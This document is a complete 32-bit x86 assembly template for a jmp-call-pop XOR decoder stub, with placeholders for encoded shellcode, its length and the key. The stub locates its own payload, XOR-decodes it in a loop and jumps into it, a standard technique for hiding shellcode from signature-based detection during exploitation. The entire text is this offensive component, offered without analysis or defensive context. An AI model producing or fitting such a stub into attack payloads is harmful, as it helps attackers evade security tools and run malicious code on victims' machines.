bits 32

jmp short shell

ret:
    pop esi
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx

    mov bl, {encoded_shellcode_size}
    mov al, {xor_key}

loop:
    xor [esi+ecx], eax
    inc ecx
    cmp ebx, ecx
    jne loop
    jmp esi

shell:
    call ret ;adress of shellcode is pushed to top of the stack
    shellcode db {shellcode}
